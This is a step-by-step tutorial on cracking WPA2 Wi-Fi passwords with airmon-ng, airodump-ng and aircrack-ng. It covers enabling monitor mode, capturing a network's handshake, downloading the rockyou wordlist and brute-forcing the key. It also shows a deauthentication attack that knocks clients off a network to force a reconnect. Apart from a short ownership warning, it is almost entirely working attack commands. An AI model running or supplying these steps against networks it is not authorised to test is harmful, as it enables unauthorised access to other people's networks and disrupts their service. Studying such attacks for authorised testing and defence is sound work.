# How to use airmon-ng

This is tutorial for "How to use airmon-ng, step-by-step explanation, basic command for this tool"; I use arch linux;

> **WARNING:** USE THIS TOOL FOR YOUR OWN DEVICES AND FOR ETHICAL PURPOSES  
> **WARNING:** YOU TAKE ALL RISKS AND RESPONSIBILITY UPON YOURSELF

> **Note:** i will use `' '` for my situations(example);
> **Note:** dont use `''` in command, i used this in order to warn you that this is my situation and example

---

For check what interfaces you have use this command:
```bash
ip a
```

---

### STEP 1: Stopping monitor mode;

To start clear and without potential bugs we should "restart" our  monitor mode.

```bash
sudo airmon-ng stop 'wlo1'mon ; 
```
*This stops mon mode that used before*

---

### STEP 2: Starting monitor mode;

To start our "travel"
```bash
sudo airmon-ng start 'wlo1' ;
```
*This starts monitor mode for adapter*

After using this command device will be renamed to devicename + mon  
**FOR EXAMPLE:** `wlo1` --> `wlo1mon`

**ATTENTION:** If there is warning that something can cause trouble use:
```bash
sudo airmon-ng check kill ;
```

---

### STEP 3: Scanning nearby devices;

```bash
sudo airodump-ng 'wlo1mon' ;
```
*This starts scanning mode*

Wait for 10-15 seconds and then stop scanning by pressing `Ctrl + C`

**EXAMPLE:**
```text
BSSID 00:11:22:33:44:55
PWR -85  
Beacons 2    
#Data 0 
#/s 0 
CH 1   
MB 130  
ENC WPA2 
CIPHER CCMP 
AUTH PSK  
ESSID aktv 21. 
```

From here we need BSSID(MAC address), CH(Channel) and ESSID(public name)

---

### STEP 4: Capturing the handshake;

```bash							 
sudo airodump-ng -c '1' --bssid '00:11:22:33:44:55' -w 'test' 'wlo1mon';
```

**EXPLANATION:**
- `-c` is definition of channel;
- `--bssid` is definition of bssid;
- `-w` is definition of write, where we will save the file .cap(in my situation it will be test-01.cap);
- then we just write our interface where monitor mode is active;

Stop this command when you see `"WPA handshake: 00:11:22:33:44:55"`

---

### STEP 5: Opening the .cap file and visualising handshake in wireshark ;

```bash
wireshark 'test'-01.cap
```
*(-01 -02 -XX will be after file's name, if use command on step 4 again again and again);*

In wireshark apply display filter : `eapol`  
Then you will see up to 4 packets(messages)  
Verify that EAPOL packets (Messages 1-4) are captured cleanly before starting brute-force

---

### STEP 6: Cracking the Handshake (Most exciting moment);

For the bosses we need to get .txt wordlist with passwords  
You can generate file on your own(with crunch) or use ready-made wordlist  
I will use rockyou.txt from internet

```bash
curl -L https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt
```
*This is for get rockyou.txt*

```bash
aircrack-ng -w 'rockyou.txt' -b '00:11:22:33:44:55' 'test-01'.cap
```

---

### ADDITIONAL:

If client isnt connecting or handshake is taking long, we can force a device to reconnect:
```bash
sudo aireplay-ng -0 5 -a '00:11:22:33:44:55' 'wlo1mon'
```

**EXPLANATION:**
- `-0` --> deauth attack mode
- `5` --> number of deauth packets
- `-a` --> target bssid
- `wlo1mon` --> your monitor mode interface

---

### CONGRATULATIONS FOR COMPLETING THIS MINI COURSE "How to use airmon"
